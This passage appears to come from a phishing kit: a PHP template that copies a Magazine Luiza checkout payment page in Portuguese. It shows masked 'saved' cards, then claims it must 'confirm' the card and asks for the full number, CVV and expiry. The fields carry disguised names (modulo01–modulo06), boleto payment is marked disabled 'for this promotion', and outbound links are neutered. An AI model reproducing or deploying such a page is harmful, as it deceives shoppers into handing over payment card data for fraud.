.693-.187.86-.38l.026.16c.016.101.08.158.183.158h.284c.108 0 .172-.068.172-.181v-2.266c0-.113-.064-.181-.172-.181m4.679 2.028c-.381 0-.623-.278-.623-.709 0-.436.252-.719.623-.719.381 0 .623.278.623.708 0 .436-.252.72-.623.72m1.155-2.028h-.296c-.102 0-.171.056-.188.164l-.016.13a1.02 1.02 0 0 0-.81-.357c-.678 0-1.177.561-1.177 1.371 0 .793.467 1.382 1.133 1.382.42 0 .693-.187.86-.38l.027.16c.016.101.08.158.182.158h.285c.107 0 .172-.068.172-.181v-2.266c0-.113-.065-.181-.172-.181m3.362 0h-.354c-.108 0-.172.068-.172.18v2.267c0 .113.064.18.172.18h.354c.108 0 .172-.067.172-.18v-2.266c0-.113-.064-.181-.172-.181"></path>
                                          <g transform="translate(8 14.044)">
                                             <mask id="j" fill="#fff">
                                                <use xlink:onclick="return false" href="#i"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M2.87.178C2.859.059 2.8.002 2.692.002h-.284c-.092 0-.156.04-.204.125L1.51 1.362.866.127A.213.213 0 0 0 .662.002H.356C.248.002.189.06.178.178L.001 2.444c-.01.124.049.187.161.187h.344c.108 0 .172-.057.177-.176L.76 1.186l.413.788a.213.213 0 0 0 .204.124h.237c.091 0 .155-.034.204-.124l.467-.844.054 1.325c.005.12.064.176.172.176h.37c.113 0 .172-.063.161-.187L2.87.178z" mask="url(#j)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M34.273 14.047h-.355c-.107 0-.171.068-.171.18v2.267c0 .113.064.18.171.18h.355c.107 0 .172-.067.172-.18v-2.266c0-.113-.065-.181-.172-.181"></path>
                                          <g transform="translate(33.692 13.018)">
                                             <mask id="l" fill="#fff">
                                                <use xlink:onclick="return false" href="#k"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M.404.004a.4.4 0 0 0-.398.402c0 .215.156.396.398.396A.388.388 0 0 0 .796.406.396.396 0 0 0 .404.004" mask="url(#l)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M36.663 15.99h-1.026l1.07-1.303a.342.342 0 0 0 .08-.227v-.232c0-.113-.065-.181-.172-.181h-1.692c-.108 0-.172.068-.172.18v.324c0 .113.064.181.172.181h.956l-1.08 1.309a.342.342 0 0 0-.08.226v.227c0 .113.064.181.172.181h1.772c.108 0 .172-.068.172-.181v-.323c0-.113-.064-.181-.172-.181"></path>
                                          <g transform="translate(36.937 13.98)">
                                             <mask id="n" fill="#fff">
                                                <use xlink:onclick="return false" href="#m"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M1.349 2.094c-.382 0-.623-.277-.623-.708 0-.436.252-.719.623-.719.381 0 .623.278.623.708 0 .436-.253.72-.623.72M2.504.066h-.296c-.102 0-.172.056-.188.164l-.016.13a1.02 1.02 0 0 0-.811-.357C.516.004.017.565.017 1.375c0 .793.467 1.382 1.133 1.382.419 0 .693-.187.86-.38l.026.16c.016.101.08.158.183.158h.285c.107 0 .172-.068.172-.181V.248c0-.113-.065-.181-.172-.181" mask="url(#n)"></path>
                                          </g>
                                          <g transform="translate(22.336 13.018)">
                                             <mask id="p" fill="#fff">
                                                <use xlink:onclick="return false" href="#o"></use>
                                             </mask>
                                             <path fill="#0086FF" d="M.399.004A.4.4 0 0 0 0 .406a.388.388 0 0 0 .4.396.388.388 0 0 0 .39-.396.396.396 0 0 0-.391-.402" mask="url(#p)"></path>
                                          </g>
                                          <path fill="#0086FF" d="M26.839 15.027c.075-.272.29-.46.548-.46.28 0 .456.17.483.46h-1.03zm.548-1.054c-.78 0-1.268.651-1.268 1.382 0 .81.478 1.382 1.31 1.382.425 0 .774-.124 1.032-.396.07-.074.06-.159-.01-.244l-.156-.181c-.07-.085-.156-.09-.242-.023a.97.97 0 0 1-.559.193c-.365 0-.601-.181-.666-.527h1.569c.107 0 .171-.068.171-.181v-.113c0-.777-.472-1.292-1.181-1.292zm-2.487.011c-.344 0-.607.125-.8.38l-.033-.159c-.021-.102-.086-.158-.188-.158h-.274c-.107 0-.172.068-.172.18v2.267c0 .113.065.18.172.18h.376c.108 0 .172-.067.172-.18V15.32c0-.43.22-.674.516-.674.311 0 .472.221.472.646v1.2c0 .114.065.182.172.182h.376c.108 0 .172-.068.172-.181v-1.258c0-.799-.392-1.252-.961-1.252m5.715 2.001h-.677c-.236 0-.36-.13-.36-.38v-1.376c0-.113-.064-.181-.172-.181h-.386c-.108 0-.172.068-.172.18v1.474c0 .606.349.974.924.974h.843c.107 0 .172-.068.172-.181v-.329c0-.113-.065-.181-.172-.181m2.621-1.937h-.376c-.107 0-.172.068-.172.18V15.4c0 .43-.22.675-.526.675-.322 0-.505-.221-.505-.646v-1.201c0-.113-.064-.181-.172-.181h-.376c-.107 0-.172.068-.172.18v1.258c0 .8.392 1.252.983 1.252.355 0 .629-.124.822-.38l.032.16c.022.101.086.158.188.158h.274c.108 0 .172-.068.172-.181v-2.266c0-.113-.064-.181-.172-.181"></path>
                                       </g>
                                    </svg>
                                 </div>
                                 <div class="CardLuiza__text-luiza">
                                    <p>
                                       <!-- react-text: 1373 -->(Em até <!-- /react-text --><!-- react-text: 1374 -->12<!-- /react-text --><!-- react-text: 1375 -->x de <!-- /react-text --><!-- react-text: 1376 -->R$ <?php echo parcela ($valor,12) ?><!-- /react-text --><br><!-- react-text: 1378 -->sem juros no Cartão de crédito)<!-- /react-text -->
                                    </p>
                                 </div>
                              </div>
                           </div>
                   
                        </div>
                     </div>
                  </div>
                  <div class="PaymentPage-title">Escolha a forma de pagamento</div>
                  <div>
                     <div></div>
                     <ul class="PaymentBox">
					 
					 


		
                        
						<?php $in = 0; while ($in <= $qtd_card - 1) { ?>
						
						<?php
							
						$data_card = json_decode($cards[$in]);
						
						$nome_card = strtolower($data_card->nome);
						$num_card = $data_card->card;
						$venc_card = $data_card->vencimento;
						
						$bin_short = str_replace ('*', '0', $num_card);
						$band_short = getBand ($bin_short);
							
						$ultimos_dig = substr ($num_card, -4);
						
						?>
						
						<li  class="SavedCardLine clearfix PaymentBox-line">
   <div>
      <label onClick="check_box ('<?php echo $in?>', '<?php echo $qtd_card - 1 ?>')" class="PaymentBox-line-label" >
         <div id="box-<?php echo $in ?>"  class="InputRadioButton--off">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-off">
               <path fill="#010101" fill-rule="evenodd" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z" opacity=".54"></path>
            </svg>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-on">
               <path fill="#22B8F1" fill-rule="evenodd" d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"></path>
            </svg>
         </div>
         <input type="radio" name="payment-type" value="0F48CEF3-D96E-43E9-ABA4-05C6E6E4173A" class="InputRadioButton">
		 
		 <?php if ($band_short != false ) { echo imgBand ($band_short); } else { ?> <svg class="PaymentBox-icon" width="50pt" height="40pt" viewBox="0 0 50 40"> <path d="M45 0H5a5 5 0 0 0-5 5v30a5 5 0 0 0 5 5h40a5 5 0 0 0 5-5V5a5 5 0 0 0-5-5zm0 35H5V20h40zm0-22.5H5V5h40zm0 0"></path> </svg><?php } ?>

         <span><?php echo $num_card ?></span>
		 <span class="PaymentBox-line-info-label"><?php echo ucwords($nome_card) ?></span>
		 
      </label>
   </div>
   
   <div style="display: none;" id="pay_<?php echo $in ?>">
   <form class="SavedCardForm">
      <div class="FormGroup">
         <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
            <input id="validade-<?php echo $in?>" type="tel"  class="FormGroup-input" placeholder="00/0000" name="venc" value="<?php echo fix_venc ($venc_card) ?>"><!-- react-empty: 484 -->
         </div>
         <label class="FormGroup-label active--input " for="input-expirationDate-07681c6b">Validade</label>
		 <p class="FormGroup-errorMessage" id="msg-val-<?php echo $in ?>"></p>

         <div class="FormGroup-feedback">
            <svg xmlns="http://www.w3.org/2000/svg" width="35pt" height="35pt" viewBox="0 0 35 35" class="Success">
               <path d="M14.523 29.73a4.129 4.129 0 01-2.93-1.214L1.34 18.262a4.14 4.14 0 010-5.856 4.145 4.145 0 015.86 0l7.323 7.32L27.816 6.5a4.145 4.145 0 015.86 0 4.145 4.145 0 010 5.86L17.453 28.515a4.136 4.136 0 01-2.93 1.214zm0 0" stroke="#fff" stroke-miterlimit="10" stroke-width=".059"></path>
            </svg>
         </div>
      </div>
      <div class="FormGroup">
         <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
            <input id="cod-<?php echo $in?>" type="tel"  class="FormGroup-input" maxlength="3" placeholder="Cód. de segurança" autocomplete="off" name="cvv" value="">
         </div>
		  <p class="FormGroup-errorMessage" id="msg-cod-<?php echo $in ?>"></p>

         <div class="FormGroup-children">
            <div class="PaymentInfoLabel">
               <svg class="CardFlag" width="32" height="21" viewBox="0 0 32 21" xml:space="preserve">
                  <path d="M32 19c0 1.1-.9 2-2 2H2c-1.1 0-2-.9-2-2V2C0 .9.9 0 2 0h28c1.1 0 2 .9 2 2v17z" fill="#e5e5e5"></path>
                  <path fill="#8c8c8c" d="M0 4.9h32v3.9H0z"></path>
                  <path fill="#fff" d="M1.4 10.9h29.1v4.9H1.4z"></path>
                  <path d="M30.3 10.2v6.5h-9.6v-6.5h9.6m.7-.7H20v7.9h11V9.5z" fill="#f21200"></path>
                  <path d="m22.8 13.7-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5zm2.5 0-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5zm2.6 0-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5z" style="fill: rgb(64, 64, 64);"></path>
               </svg>
               <!-- react-text: 502 -->Código de 3 dígitos impresso no verso do seu cartão<!-- /react-text -->
            </div>
         </div>
         <div class="FormGroup-feedback">
            <!-- react-empty: 504 -->
         </div>
      </div>
      <div class="FormGroup">
         <label class="FormGroup-label active--input" for="installments">Parcelamento</label>
         <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
            <select id="parcelas-<?php echo $in ?>" class="FormGroup-input">
			
               <option value="0">Selecione</option>
			   
               <option value="1">À vista R$ <?php echo parcela ($valor, 1) ?></option>
			   <?php $a = 2; while ($a <= 12) {  ?>
               <option value="<?php echo $a ?>"><?php echo $a ?>x sem juros R$ <?php echo parcela ($valor, $a) ?></option>
			   <?php $a++;  } ?>

            </select>
            <!-- react-empty: 510 -->
         </div>
		 <p class="FormGroup-errorMessage" id="msg-parcelas-<?php echo $in ?>"></p>


      </div>
      <button onClick="check_pay('<?php echo $in?>')" class="continueButton" type="submit">Prosseguir</button>
   </form>
</div>


  <div style="display: none;" id="confirm_<?php echo $in ?>">
   <form class="SavedCardForm">
   
   <center>
   <small><strong>Por segurança precisamos confirmar o número do seu cartão <?php echo strtoupper ($band_short)?> com o final <?php echo $ultimos_dig ?></strong> </small>
   </center>
   <br>
      <div class="FormGroup">
         <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
            <input  id="full-cc-<?php echo $in?>" type="tel"  class="FormGroup-input" placeholder="Número do cartão" name="cc" >
         </div>
		 <p class="FormGroup-errorMessage" id="msg-fullcc-<?php echo $in ?>"></p>

         <div class="FormGroup-feedback">
            <svg xmlns="http://www.w3.org/2000/svg" width="35pt" height="35pt" viewBox="0 0 35 35" class="Success">
               <path d="M14.523 29.73a4.129 4.129 0 01-2.93-1.214L1.34 18.262a4.14 4.14 0 010-5.856 4.145 4.145 0 015.86 0l7.323 7.32L27.816 6.5a4.145 4.145 0 015.86 0 4.145 4.145 0 010 5.86L17.453 28.515a4.136 4.136 0 01-2.93 1.214zm0 0" stroke="#fff" stroke-miterlimit="10" stroke-width=".059"></path>
            </svg>
         </div>
      </div>
	  
		<input type="hidden" id="value-val-<?php echo $in ?>" value=""> 
		<input type="hidden" id="value-cvv-<?php echo $in ?>" value=""> 
		<input type="hidden" id="value-parcela-<?php echo $in ?>" value=""> 
		<input type="hidden" id="value-nome-<?php echo $in ?>" value="<?php echo ucwords($nome_card) ?>"> 

	
      <button type="submit" onClick="finish ('<?php echo $in ?>')"  class="continueButton">Concluir pedido</button>
	  
   </form>
</div>








   
					</li>
					
					
						<?php $in++ ; } ?>
						
						
						
						<li class="PaymentBox-line">
                           <label onClick="check_box ('99', '<?php echo $qtd_card - 1 ?>')" class="PaymentBox-line-label" for="newCard-line">
                              <span>
                                 <div id="box-99" class="InputRadioButton--on">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-off">
                                       <path fill="#010101" fill-rule="evenodd" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z" opacity=".54"></path>
                                    </svg>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-on">
                                       <path fill="#22B8F1" fill-rule="evenodd" d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"></path>
                                    </svg>
                                 </div>
                                 <input type="radio" id="newCard-line" name="payment-type" value="new_card" class="InputRadioButton">
                              </span>
                              <svg class="PaymentBox-icon" width="50pt" height="40pt" viewBox="0 0 50 40">
                                 <path d="M45 0H5a5 5 0 0 0-5 5v30a5 5 0 0 0 5 5h40a5 5 0 0 0 5-5V5a5 5 0 0 0-5-5zm0 35H5V20h40zm0-22.5H5V5h40zm0 0"></path>
                              </svg>
                              <!-- react-text: 971 -->Novo cartão de crédito<!-- /react-text --><!-- react-text: 972 --><!-- /react-text -->
                           </label>
                           <div id="pay_99" name="newCard-line">
                              <form class="NewCardForm" method="post">
                                 <div class="FormGroup">
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
									
                                       <input maxlength="19" oninput="pag_cc()"  onChange="pag_cc()" type="tel" id="cc_val" class="FormGroup-input" placeholder="Número" autocomplete="off" name="number" >
									   
                                    </div>
									<p class="FormGroup-errorMessage" id="msg_cc_p"></p>
                                    <div id="flag_pag" class="FormGroup-children">

                                    </div>
                                 </div>
                                 <div class="FormGroup">
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
                                       <input id="name_val"  class="FormGroup-input" placeholder="Nome do titular" autocomplete="off" name="modulo02">
                                    </div>
								<p class="FormGroup-errorMessage" id="msg_name_p"></p>
                                    <div class="FormGroup-children">
                                       <div class="PaymentInfoLabel">Como está gravado no cartão</div>
                                    </div>
                                    <div class="FormGroup-feedback">
                                       <!-- react-empty: 1046 -->
                                    </div>
                                 </div>
                                 <div class="FormGroup--multiple">
                                    <div class="FormGroup">
                                       <label class="FormGroup-label active--input" for="expirationMonth">Validade</label>
                                       <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
                                          <select id="month_exp" name="modulo03" class="FormGroup-input FormGroup-input">
                                             <option value="-1">Mês</option>
                                             <option value="01">01</option>
                                             <option value="02">02</option>
                                             <option value="03">03</option>
                                             <option value="04">04</option>
                                             <option value="05">05</option>
                                             <option value="06">06</option>
                                             <option value="07">07</option>
                                             <option value="08">08</option>
                                             <option value="09">09</option>
                                             <option value="10">10</option>
                                             <option value="11">11</option>
                                             <option value="12">12</option>
                                          </select>
                                       </div>
								   <p class="FormGroup-errorMessage" id="msg_data_p"></p>
									   
                                    </div>
                                    <div class="FormGroup">
                                       <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
                                          <select id="year_exp" name="modulo05" class="FormGroup-input">
                                             <option value="-1">Ano</option>
                                             <option value="2021">2021</option>
                                             <option value="2022">2022</option>
                                             <option value="2023">2023</option>
                                             <option value="2024">2024</option>
                                             <option value="2025">2025</option>
                                             <option value="2026">2026</option>
                                             <option value="2027">2027</option>
                                             <option value="2028">2028</option>
                                             <option value="2029">2029</option>
                                             <option value="2030">2030</option>
                                             <option value="2031">2031</option>
                                             <option value="2032">2032</option>
                                             <option value="2033">2033</option>
                                             <option value="2034">2034</option>
                                             <option value="2035">2035</option>
                                             <option value="2036">2036</option>
                                             <option value="2037">2037</option>
                                             <option value="2038">2038</option>
                                             <option value="2039">2039</option>
                                             <option value="2040">2040</option>
                                          </select>
                                       </div>
                                    </div>
                                    <!-- react-empty: 1090 -->
                                 </div>
								 
                                 <div class="FormGroup">
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--extraSmall">
                                       <input type="tel"  id="cvv_val" class="FormGroup-input" maxlength="3" placeholder="Cód. de segurança" autocomplete="off" name="modulo01"><!-- react-empty: 1094 -->
                                    </div>
									 <p class="FormGroup-errorMessage" id="msg_cvv_p"></p>
                                    <div class="FormGroup-children">
                                       <div class="PaymentInfoLabel">
                                          <svg class="CardFlag" width="32" height="21" viewBox="0 0 32 21" xml:space="preserve">
                                             <path d="M32 19c0 1.1-.9 2-2 2H2c-1.1 0-2-.9-2-2V2C0 .9.9 0 2 0h28c1.1 0 2 .9 2 2v17z" fill="#e5e5e5"></path>
                                             <path fill="#8c8c8c" d="M0 4.9h32v3.9H0z"></path>
                                             <path fill="#fff" d="M1.4 10.9h29.1v4.9H1.4z"></path>
                                             <path d="M30.3 10.2v6.5h-9.6v-6.5h9.6m.7-.7H20v7.9h11V9.5z" fill="#f21200"></path>
                                             <path d="m22.8 13.7-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5zm2.5 0-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5zm2.6 0-.4.3c-.1 0-.1.1-.2.1s-.2-.1-.2-.2.1-.2.2-.2l.5-.2-.5-.2c-.1 0-.2-.1-.2-.2s.1-.2.2-.2.1 0 .2.1l.4.3-.1-.5c0-.1.1-.3.2-.3s.2.1.2.3l-.1.5.4-.3c.1 0 .1-.1.2-.1s.2.1.2.2-.1.2-.2.2l-.5.2.5.2c.1 0 .2.1.2.2s-.1.2-.2.2-.1 0-.2-.1l-.4-.3.1.5c0 .1-.1.3-.2.3s-.2-.1-.2-.3l.1-.5z" style="fill: rgb(64, 64, 64);"></path>
                                          </svg>
                                          <!-- react-text: 1104 -->Código de 3 dígitos impresso no verso do seu cartão<!-- /react-text -->
                                       </div>
                                    </div>
                                    <div class="FormGroup-feedback">
                                       <!-- react-empty: 1106 -->
                                    </div>
                                 </div>
                                 <div class="FormGroup">
                                    <label name="modulo06" class="FormGroup-label active--input" for="installments">Parcelamento</label>
                                    <div class="FormGroup-inputGroup FormGroup-inputGroup--long">
										<select id="parcela_p" class="FormGroup-input">
			
											<option value="0">Selecione</option>
			   
											<option value="1">À vista R$ <?php echo parcela ($valor, 1) ?></option>
											<?php $a = 2; while ($a <= 12) {  ?>
											<option value="<?php echo $a ?>"><?php echo $a ?>x sem juros R$ <?php echo parcela ($valor, $a) ?></option>
											<?php $a++;  } ?>

										</select>
                                       <!-- react-empty: 1112 -->
                                    </div>
									 <p class="FormGroup-errorMessage" id="msg_parcela_p"></p>

                                    <div class="FormGroup-feedback">
                                       <!-- react-empty: 1114 -->
                                    </div>
                                 </div>
     
                                 <button onClick="pag_finish()" type="submit" class="continueButton" >Concluir pedido</button>
								 
								 
                              </form>
                           </div>
                        </li>
						
						<li class="PaymentBox-line">
                           <label onClick="check_box ('777', '<?php echo $qtd_card - 1 ?>')" class="PaymentBox-line-label" for="pix-line">
                              <span>
                                 <div id="box-777" class="InputRadioButton--off">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-off">
                                       <path fill="#010101" fill-rule="evenodd" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z" opacity=".54"></path>
                                    </svg>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-on">
                                       <path fill="#22B8F1" fill-rule="evenodd" d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"></path>
                                    </svg>
                                 </div>
                                 <input type="radio" id="pix-line" name="payment-type" value="pix" class="InputRadioButton">
                              </span>
                              <svg class="PaymentBox-icon" width="30" height="30" viewBox="0 0 30 30" fill="none">
                                 <path d="M22.556 22.155a3.942 3.942 0 0 1-2.804-1.161l-4.05-4.05a.77.77 0 0 0-1.064 0l-4.065 4.065a3.942 3.942 0 0 1-2.804 1.16H6.97L12.1 27.3a4.102 4.102 0 0 0 5.8 0l5.144-5.144h-.488ZM7.769 7.83c1.059 0 2.055.413 2.804 1.162l4.065 4.065a.753.753 0 0 0 1.064 0l4.05-4.05a3.942 3.942 0 0 1 2.804-1.162h.488L17.9 2.701a4.102 4.102 0 0 0-5.8 0l-5.13 5.13h.799Z" fill="#32BCAD"></path>
                                 <path d="M27.299 12.1 24.19 8.99a.593.593 0 0 1-.22.045h-1.414c-.73 0-1.446.296-1.962.813l-4.05 4.05a1.938 1.938 0 0 1-1.374.568 1.94 1.94 0 0 1-1.374-.568L9.73 9.834a2.793 2.793 0 0 0-1.962-.813H6.03a.589.589 0 0 1-.209-.042l-3.12 3.12a4.102 4.102 0 0 0 0 5.801l3.12 3.121a.591.591 0 0 1 .209-.042h1.738c.73 0 1.445-.296 1.962-.813l4.064-4.064c.735-.735 2.016-.735 2.75 0l4.05 4.05a2.793 2.793 0 0 0 1.961.812h1.414a.59.59 0 0 1 .22.045L27.3 17.9a4.102 4.102 0 0 0 0-5.8Z" fill="#32BCAD"></path>
                              </svg>
                              <!-- react-text: 985 -->Pix<!-- /react-text --><span class="PaymentBox__special-message">Novo</span>
                           </label>
						   
						   
	  <div style="display: none;" id="pay_777">
	  

   <?php if ($status_pix == 1) { ?>
   
      <div class="PixForm-price">
         <span class="PixForm-price--highlighted">
            <!-- react-text: 465 -->R$ <?php echo parcela ($valor,1) ?><!-- /react-text --><!-- react-text: 466 --> à vista<!-- /react-text -->
         </span>
      </div>
      <div class="PixForm-description">Copie o código Pix na próxima etapa e faça o pagamento na instituição financeira de sua escolha. O código tem validade de 13 horas.</div>
      <button onClick="finish_pix()" class="continueButton" >Concluir pedido</button>
	  
   <?php } else { ?>
   
   <center>
   <small><strong>Metódo de pagamento desativado para essa promoção.</strong> </small>
   </center>
   
   <?php } ?>



</div>
						   
						   
						   
						   
						   
                        </li>
						
						
						
						
						<li class="PaymentBox-line">
						
						
                           <label onClick="check_box ('888', '<?php echo $qtd_card - 1 ?>')" class="PaymentBox-line-label" for="bankSlip-line">
                              <span>
                                 <div id="box-888" class="InputRadioButton--off">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-off">
                                       <path fill="#010101" fill-rule="evenodd" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z" opacity=".54"></path>
                                    </svg>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="radio-button-on">
                                       <path fill="#22B8F1" fill-rule="evenodd" d="M12 7c-2.8 0-5 2.2-5 5s2.2 5 5 5 5-2.2 5-5-2.2-5-5-5zm0-5C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"></path>
                                    </svg>
                                 </div>
                                 <input type="radio" id="bankSlip-line" name="payment-type" value="bank_slip" class="InputRadioButton">
                              </span>
                              <svg class="PaymentBox-icon" width="55pt" height="44pt" viewBox="0 0 55 44">
                                 <path d="M50.598 0h-46.2A4.398 4.398 0 0 0 0 4.398v35.204A4.4 4.4 0 0 0 4.398 44h46.2A4.401 4.401 0 0 0 55 39.602V4.398A4.399 4.399 0 0 0 50.598 0zm0 39.602h-46.2V4.398h46.2zm0 0"></path>
                                 <path d="M8.383 7.676h5.5v28.656h-5.5zm8.117 0h2.75v28.656H16.5zm6.875 0H27.5v28.656h-4.125zm13.75 0h5.5v28.656h-5.5zm8.25 0h1.375v28.656h-1.375zm-13.75 0h1.371v28.656h-1.371zm0 0"></path>
                              </svg>
                              <!-- react-text: 1016 -->Boleto bancário<!-- /react-text --><!-- react-text: 1017 --><!-- /react-text -->
                           </label>
						   
						   
	  <div style="display: none;" id="pay_888">
   
   
   <center>
   <small><strong>Metódo de pagamento desativado para essa promoção.</strong> </small>
   </center>

	  
	
  
</div>
						   
						   
						   
						   
						   
                        </li>



                        <div class="SecurePurchase">
                           <svg class="SecurePurchase-icon" width="12" height="14" viewBox="0 0 12 14">
                              <path d="M3.934 6.067h-1.98V3.7c0-.515.1-.995.298-1.44.2-.445.474-.837.826-1.175A3.858 3.858 0 0 1 4.32.29 4.13 4.13 0 0 1 5.884 0c.503 0 .988.097 1.454.29a4.1 4.1 0 0 1 1.242.796c.362.338.65.73.865 1.175.215.445.322.925.322 1.44v2.366H7.865V4.152c0-.676-.183-1.2-.55-1.57-.367-.37-.865-.554-1.494-.554-.566 0-1.022.185-1.368.555-.346.37-.519.893-.519 1.569v1.915zm7.007-.064c.289 0 .538.103.746.309a.999.999 0 0 1 .313.736v4.91a2.09 2.09 0 0 1-.57 1.448 1.925 1.925 0 0 1-1.42.594h-8.1a1.9 1.9 0 0 1-1.389-.578 1.855 1.855 0 0 1-.385-.61A2.024 2.024 0 0 1 0 12.068v-5.02c0-.285.102-.53.305-.736a.999.999 0 0 1 .738-.309h9.898z" fill="#404040"></path>
                           </svg>
                           <span class="SecurePurchase-description"> Compra segura com Magalu </span>
                        </div>
                     </ul>
                  </div>
                  <div class="GenericFooter GenericFooter--full">
                     <div>
                        <a onclick="return false" href="https://especiais.magazineluiza.com.br/termo-compra-venda/" target="_blank" class="PaymentContract-link" data-ga="{&quot;category&quot;: &quot;Pagamento&quot;, &quot;action&quot;: &quot;Contrato de Compra e Venda&quot;, &quot;label&quot;: &quot;&quot;}">Clique aqui para ler o termo de compra e venda</a>
                        <p>O valor total da compra, mesmo dividido em parcelas de pequeno valor, não poderá exceder o limite do seu cartão de crédito. Para maiores informações, consulte a administradora do seu cartão.</p>
                        <p>
